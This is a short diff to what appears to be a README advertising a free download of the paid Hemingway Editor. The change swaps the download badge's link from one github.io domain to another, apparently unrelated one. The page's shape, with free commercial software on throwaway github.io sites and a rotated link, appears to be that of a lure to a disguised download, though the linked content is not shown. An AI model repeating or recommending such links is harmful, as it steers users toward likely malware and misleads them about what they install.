@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=78052ac9ad13747a0498aadc5accea0050c60474-5873252-images-thumbs&n=13)
 
-[![GET Hemingway Editor](https://img.shields.io/badge/GET%20%E2%80%94%20Hemingway%20Editor-0078D6?style=for-the-badge&logoColor=white)](https://boot-time-diagnostic-tools.github.io/.github/hemingway-editor-free)
+[![GET Hemingway Editor](https://img.shields.io/badge/GET%20%E2%80%94%20Hemingway%20Editor-0078D6?style=for-the-badge&logoColor=white)](https://riopacecunr.github.io/.github/hemingway-editor-free)
 
 ---
 
